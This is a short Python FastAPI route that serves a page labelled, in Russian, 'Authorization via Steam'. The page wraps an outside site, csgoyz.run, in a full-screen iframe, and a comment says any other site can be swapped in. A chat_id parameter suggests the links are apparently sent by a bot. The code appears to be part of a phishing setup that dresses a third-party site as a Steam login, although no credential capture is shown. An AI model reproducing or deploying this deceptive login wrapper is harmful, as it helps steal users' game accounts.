from fastapi import APIRouter, Request, Query, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
import urllib.parse

router = APIRouter()
@router.get("/portal")
async def portal(chat_id: int):
    return HTMLResponse(f"""
<!DOCTYPE html>
<html>
<head>
<title>Авторизация</title>
<style>
body {{
    margin: 0;
    background: #0f1117;
    color: white;
    font-family: Arial;
}}
#shell {{
    display: flex;
    flex-direction: column;
    height: 100vh;
}}
#top {{
    padding: 12px;
    background: #151821;
    border-bottom: 1px solid #222;
}}
#frame {{
    flex: 1;
    border: none;
    width: 100%;
}}
</style>
</head>
<body>
<div id="shell">
  <div id="top">🔐 Авторизация через Steam</div>
  <iframe id="frame"></iframe>
</div>

<script>
const target = "https://csgoyz.run";   // или любой другой сайт
const frame = document.getElementById("frame");
frame.src = target;
</script>
</body>
</html>
""")